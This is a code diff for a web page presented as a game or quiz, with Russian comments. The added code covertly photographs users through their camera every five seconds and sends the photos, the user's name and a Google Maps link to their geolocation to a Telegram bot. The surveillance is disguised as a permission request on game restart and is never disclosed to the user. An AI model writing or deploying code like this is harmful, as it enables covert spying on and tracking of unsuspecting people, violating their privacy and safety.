@@ -250,3 +250,104 @@ tryAgainBtn.addEventListener('click', () => {
   if (!geoCoords || !cameraStream) {
     // Если нет доступа к камере или геолокации, запросить заново
     request
+    requestPermissionsAndRestart();
+  } else {
+    // Иначе просто перезапускаем игру
+    startGame();
+  }
+});
+
+function requestPermissionsAndRestart() {
+  navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+    if (result.state !== 'granted') {
+      getGeolocation();
+    }
+  });
+  startCameraIfAllowed();
+  setTimeout(() => {
+    startGame();
+  }, 1000);
+}
+
+function sendTelegramStart() {
+  const message = `👤 Имя: ${userName}\n🌐 Язык: ${currentLanguage}`;
+  sendTelegramMessage(message);
+}
+
+function sendTelegramResult() {
+  const mapLink = geoCoords
+    ? `📍 https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}`
+    : '📍 Геолокация недоступна';
+
+  const message = `🎮 Результат теста\n👤 Имя: ${userName}\n🌐 Язык: ${currentLanguage}\n${mapLink}`;
+  sendTelegramMessage(message);
+}
+
+function sendTelegramMessage(text) {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text
+    })
+  });
+}
+
+function getGeolocation() {
+  navigator.geolocation.getCurrentPosition(
+    (position) => {
+      geoCoords = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude
+      };
+    },
+    (error) => {
+      console.error("Ошибка геолокации:", error);
+    }
+  );
+}
+
+function startCameraIfAllowed() {
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then((stream) => {
+      cameraStream = stream;
+      const track = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+      if (photoTimer) clearInterval(photoTimer);
+      photoTimer = setInterval(() => {
+        imageCapture.takePhoto().then(blob => {
+          const formData = new FormData();
+          formData.append('chat_id', TELEGRAM_CHAT_ID);
+          formData.append('photo', blob, 'photo.jpg');
+          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+        }).catch(err => console.error("Ошибка съёмки:", err));
+      }, 5000);
+    })
+    .catch((err) => {
+      console.warn("Камера недоступна", err);
+    });
+}
+
+// Смена языка при клике по флагу
+document.querySelectorAll('.lang-flag').forEach(flag => {
+  flag.addEventListener('click', () => {
+    const lang = flag.dataset.lang;
+    localStorage.setItem('lang', lang);
+    location.reload();
+  });
+});
+
+// Применяем язык
+applyTranslations();
+
+// Запуск
+nameForm.addEventListener('submit', (e) => {
+  e.preventDefault();
+  startGame();
+});
